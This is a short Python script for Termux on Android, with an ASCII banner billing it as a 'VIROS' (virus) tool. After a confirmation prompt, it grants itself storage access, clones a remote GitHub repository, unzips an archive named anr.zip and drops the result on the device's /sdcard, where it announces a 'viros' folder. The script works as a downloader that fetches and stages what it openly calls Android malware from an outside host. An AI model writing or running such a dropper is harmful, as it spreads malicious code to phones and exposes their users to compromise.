import os
import time
import sys
os.system('clear')


## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yellow#
#####################



print(rd+'''

__     _____ ____   ___  ____
\ \   / /_ _|  _ \ / _ \/ ___|   
 \ \ / / | || |_) | | | \___ \  
  \ V /  | ||  _ <| |_| |___) |  
   \_/  |___|_| \_\\___/|____ /   
   
          LOVE 

 ''')
def issam(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(5. / 100)
issam(yl+'''
ｉｓｓａｍ ｒａｈｍｏｕｎｉ

VIROS 📲 ☠️  
 
ANDROID   
''')
print(gr)
gg = input('[*] ENTER ☠️ y/n ==> ')
print(rd)
if gg == 'y':
    print('Ok ☠️📲 ')
    
    os.system('pkg install zip')
    os.system('pkg install unzip')
    os.system('termux-setup-storage')
    os.system('git clone https://github.com/Issamexe/vr.git')
    os.system('cd')
    os.system('cd vr && unzip anr.zip && mv anr /sdcard')
    print('viros sdcard Folder anr')
    print('''
      ┈┈┈╲┈┈┈┈╱┈┈┈┈┈┈┈
      ┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈
      ┈┈┃┈▇┈┈▇┈┃┈┈┈┈┈┈
      ╭╮┣━━━━━━┫╭╮┈┈┈┈
      ┃┃┃┈┈┈┈┈┈┃┃┃┈┈┈┈
      ╰╯┃┈┈┈┈┈┈┃╰╯┈┈┈┈
      ┈┈╰┓┏━━┓┏╯┈┈┈┈┈┈
      ┈┈┈╰╯┈┈╰╯┈ ''')
    nn = input('y/n ==> ')
    if nn == 'y':
        os.system('cd && rm -rif vr')
else:
    os.system('exit')
    os.system('exit')
    os.system('cd')
    os.system('exit')


